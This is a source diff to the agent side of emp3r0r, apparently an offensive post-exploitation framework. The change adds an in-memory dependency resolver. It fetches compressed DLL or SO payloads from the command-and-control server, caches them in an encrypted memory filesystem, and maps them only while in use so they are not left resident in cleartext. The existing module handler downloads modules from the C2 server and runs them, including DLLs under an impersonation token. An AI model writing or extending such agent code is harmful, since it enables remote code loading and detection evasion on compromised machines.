@@ -2,6 +2,7 @@ package modules
 
 import (
 	"fmt"
+	"runtime"
 	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -10,11 +11,54 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
+	"github.com/jm33-m0/emp3r0r/core/lib/memdeps"
 	"github.com/jm33-m0/emp3r0r/core/lib/script"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 var fetchFile = c2transport.FetchFile
+
+// Wire the generic in-memory dependency resolver. coffloader, libbpf and any
+// future DLL/SO dependency are fetched from encrypted memfs/C2 on demand and
+// mapped only for the duration of the operation that needs them, so none is
+// left resident in cleartext once its user has finished.
+func init() {
+	memdeps.SetResolver(fetchDependency)
+}
+
+// fetchDependency resolves a named DLL/SO dependency: encrypted memfs cache
+// first, then the C2-hosted <name>.<arch>.gz payload. The file extension is
+// platform-determined (.dll on Windows, .so elsewhere).
+func fetchDependency(name string) ([]byte, error) {
+	name = strings.ToLower(name)
+	rawKey := "memfs:///" + name + dependencyExt()
+	if cached, err := util.ReadFileAgent(rawKey); err == nil && len(cached) > 0 {
+		logging.Debugf("fetchDependency: hit memfs cache %s", rawKey)
+		return cached, nil
+	}
+
+	hostedName := fmt.Sprintf("%s.%s.gz", name, runtime.GOARCH)
+	compressed, err := fetchFile(common.RuntimeConfig, "", hostedName, "", "")
+	if err != nil {
+		return nil, fmt.Errorf("fetching %s: %w", hostedName, err)
+	}
+	data, err := util.Decompress(compressed)
+	if err != nil {
+		return nil, fmt.Errorf("decompressing %s: %w", hostedName, err)
+	}
+	if err := util.WriteFileAgent(rawKey, data, 0o600); err != nil {
+		logging.Debugf("fetchDependency: caching %s failed: %v", rawKey, err)
+	}
+	return data, nil
+}
+
+// dependencyExt is the extension dependency payloads use on this platform.
+func dependencyExt() string {
+	if runtime.GOOS == "windows" {
+		return ".dll"
+	}
+	return ".so"
+}
 
 // ModuleHandler downloads and runs modules from C2 using resolved, typed invocation data
 func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum string, invocation def.ResolvedInvocation) (out string) {
@@ -95,7 +139,7 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 	case "dll":
 		// Cache the decompressed DLL image in memfs so dependent BOF modules
 		// can re-load it without re-downloading from C2. Module names are
-		// canonicalized to lowercase to match fetchDependencyDLL.
+		// canonicalized to lowercase to match fetchDependency.
 		_ = util.WriteFileAgent("memfs:///"+modName+".dll", payload_data, 0o600)
 		err = executeWithToken(invocation.Token, func(token uintptr) error {
 			var execErr error
